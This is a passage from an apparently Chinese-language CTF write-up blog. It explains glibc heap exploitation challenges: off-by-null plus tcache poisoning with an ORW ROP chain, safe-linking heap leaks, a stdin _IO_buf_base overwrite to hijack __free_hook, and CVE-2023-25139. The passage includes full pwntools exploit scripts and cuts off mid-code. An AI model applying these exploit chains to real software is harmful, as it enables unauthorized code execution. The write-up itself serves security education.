attack取出返回栈,进行rop构造,因为可写栈有限,所以可以栈迁移到堆上,之后无论是再次栈迁移,还是利用setcontext都可行</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./nb&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-9c590524c0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(elf_path)</span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(cintent)</span><br><span class="line">itr =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cho</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Chioce &gt;&gt; &#x27;</span>,tbs(cho))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: &#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">sa(<span class="string">b&#x27;Note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(i,(p64(<span class="number">0x100</span>)+p64(<span class="number">0x20</span>))*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">delete(<span class="number">0xf</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">delete(<span class="number">0xf</span>-<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219CE0</span>-<span class="number">0x1f0</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">heap=u64(r(<span class="number">5</span>).rjust(<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">16</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(heap+<span class="number">0x510</span>)+p64(heap+<span class="number">0x510</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">edit(<span class="number">7</span>,p64(environ^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">stack=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64((stack-<span class="number">0x18</span>)^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">nnn=heap+<span class="number">0x8a0</span></span><br><span class="line">mmm=heap+<span class="number">0x820</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,p64(mmm-<span class="number">8</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(heap+<span class="number">0x520</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">2</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x1214ee</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">3</span>)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0x100</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">payload+=p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(heap)+p64(libc.address+0x2a3e5)+p64(0)+p64(libc.address+0x2be51)+p64(heap)+p64(libc.sym[&#x27;read&#x27;])+p64(libc.address+0x562ec))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(nnn)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>需要注意的几个点:</strong></p><ol><li>可以看到开始申请chunk的时候,<code>edit(i,(p64(0x100)+p64(0x20))*7)</code>往堆里填充p64(0x100)+p64(0x20),这就是未之后的off-by-null做准备,C0的size被写为0x100时,往后找到的chunk就会以写入的p64(0x100)+p64(0x20)作为prev_size和size,保持堆不被破坏,并且绕过许多物理相邻chunk检查</li><li>orw时,open的参数大多数时候可以只顾第一个参数也就是文件名指针,那可能是因为遗留的第二三个指针的值恰好合适,这次遇到了一个问题,open无法正确打开文件,因此还需要清空其第二三个参数,不过远程打通了,本地通不了(read永远读入0个字符)</li><li>这里exp泄露heap地址时其实可以与上一步合并一起利用,exp里其实多做了一些步骤,具体做法是再释放两个不相邻的chunk,之后接连取出,泄露bk字段</li><li>2.32及以上fastbin和tcache进行了加密,所以进行tcache攻击时需要先处理目标地址</li></ol><h2 id="关于tcache和fast加密后的heap-leak"><a href="#关于tcache和fast加密后的heap-leak" class="headerlink" title="关于tcache和fast加密后的heap leak"></a>关于tcache和fast加密后的heap leak</h2><p>在2.32版本中加入了关于tcache和fast的加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这个加密十分简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>现在无法像以往那样直接泄露heap</p><p>如果某个chunk并不是第一个放入处于空状态的tcache的chunk,那么就无法泄露heap</p><p>不过如果这个chunk是第一个放入处于空状态的tcache,那么因为tcache-&gt;counts[tc_idx]在tcache为空时默认为0,也就是说该chunk的next字段是由其next字段地址右移12位与0异或得到的,也就是next字段地址右移12位,再结合heap页对齐,便能够泄露heap了</p><h1 id="2023hitctf-scanf"><a href="#2023hitctf-scanf" class="headerlink" title="2023hitctf-scanf"></a>2023hitctf-scanf</h1><p><strong>标签:scanf利用|stdin利用|堆</strong></p><p><strong>题目介绍:</strong></p><p>程序提供了两个申请chunk的接口,每次malloc后会立即要求向其中scanf一个数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  qword_4060 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, qword_4060);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, ptr);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>以及对应的free,在free前会将fd字段作为一个数字输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( qword_4060 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *(_QWORD *)qword_4060);</span><br><span class="line">  <span class="built_in">free</span>(qword_4060);</span><br><span class="line">  qword_4060 = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      ptr = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外还提供了一次单字节置零的机会,以及一个getchar接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !qword_4078 )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;qword_4078, <span class="number">8uLL</span>);</span><br><span class="line">  *(_BYTE *)qword_4078 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;(&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  byte_4068 = getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>因为处于free的chunk最多只能有两个,且没有足够的操作接口,使得我们无法利用常规的方案</p><p>不过无论如何,必做的都是泄露libc</p><p>此处我们可以利用scanf读取大数字时触发malloc_consolidate</p><p>使得释放的chunk被放入smallbin从而在fd字段写上libc</p><p>但是malloc后程序强制我们向fd字段scanf,而scanf又会改变其中的libc,这时候可以用到scanf读数字绕过,即发送<code>+-.</code>三个字符中任意一个</p><p>成功泄露libc后,接下来又该如何利用</p><p>考虑到程序提供的单字节置零还没使用,于是有可以利用stdin任意写</p><p>通过单字节置零将stdin结构体的_IO_buf_base的最低字节置零,使其指向自身</p><p>在此之前先将<code>/bin/sh\0</code>字符串解包以十进制数发送以获得字符串</p><p>然后置零</p><p>观察stdin结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f904eccb8e0 &lt;_IO_2_1_stdin_&gt;:0x00000000fbad208b0x00007f904eccb963</span><br><span class="line">0x7f904eccb8f0 &lt;_IO_2_1_stdin_+16&gt;:0x00007f904eccb9640x00007f904eccb963</span><br><span class="line">0x7f904eccb900 &lt;_IO_2_1_stdin_+32&gt;:0x00007f904eccb9630x00007f904eccb963</span><br><span class="line">0x7f904eccb910 &lt;_IO_2_1_stdin_+48&gt;:0x00007f904eccb9630x00007f904eccb963</span><br><span class="line">0x7f904eccb920 &lt;_IO_2_1_stdin_+64&gt;:0x00007f904eccb9640x0000000000000000</span><br></pre></td></tr></table></figure><p>_IO_buf_base的最低字节置零的话,要填充3个字段才能再次到_IO_buf_base字段</p><p>将_IO_buf_base设为free_hook的地址,_IO_buf_base改为free_hook+8</p><p>然后此时_IO_read_ptr!=_IO_read_end</p><p>读取了0x28个字符,虽然是scanf读的但因为第一个字符为非数字字符所以直接接跳过了,所以不需要换行</p><p>所以需要使用getchar*0x28次</p><p>然后再读取就能改写free_hook了</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;&#123;&#125;[&#123;&#125;]&#123;*[]&#x27;</span> + <span class="string">b&#x27;(&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;[&#125;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">b&#x27;9&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>)) - <span class="number">0x3c4b98</span></span><br><span class="line">free_hook_addr = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">stdin_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">stdin_buf_base_addr = stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_base: %x&#x27;</span>, libc_base)</span><br><span class="line">success(<span class="string">&#x27;stdin: %x&#x27;</span>, stdin_addr)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="built_in">str</span>(u64(<span class="string">b&#x27;/bin/sh\0&#x27;</span>)).encode())</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">io.send(p64(stdin_buf_base_addr))</span><br><span class="line"></span><br><span class="line">io.send(p64(stdin_addr + <span class="number">0x83</span>) * <span class="number">3</span> + p64(free_hook_addr) + p64(free_hook_addr +</span><br><span class="line"><span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment">#for i in range(0x28):</span></span><br><span class="line"><span class="comment">#io.send(b&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">io.send(p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023tpctf-safehttpd"><a href="#2023tpctf-safehttpd" class="headerlink" title="2023tpctf-safehttpd"></a>2023tpctf-safehttpd</h1><p><strong>标签:CVE-2023-25139|堆</strong></p><p><strong>题目介绍:</strong></p><p>这题可以说一半的难度来自于逆向,逆向的量比较大,要搞清楚程序在做什么要花不少时间</p><p>不过只要足够的耐心,按照理解一个个将变量与函数命名,总能搞懂的</p><p>此外还用到了一个setlocale函数的cve,具体介绍在下方</p><p>这道题的第一大难点就是完成与程序交互的脚本</p><p>也就是上面说的逆向,完成了这一步</p><p>程序对每一个用户都会分配一个管理chunk(内部蕴含一个用来写的指针)</p><p>接下来就是利用CVE-2023-25139造成的缓冲区溢出使得一个管理chunk的写指针指向另一个管理指针,进而控制其写指针</p><p>并辅以利用程序判断用户时利用<strong>‘:’</strong>切割,使得原本只能由root使用的show和note功能可以被使用</p><p>构造时注意setlocale函数会产生大量的堆利用痕迹</p><p>那么此时已经可以做到任意地址任意写了</p><p>到这里,之后的利用就十分轻易了</p><p>可以采用泄露<code>__environ</code>符号,修改返回地址进行rop攻击与之前的强网拟态noo_heap大致相同</p><p>当然若是要采用io流攻击也是可以的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 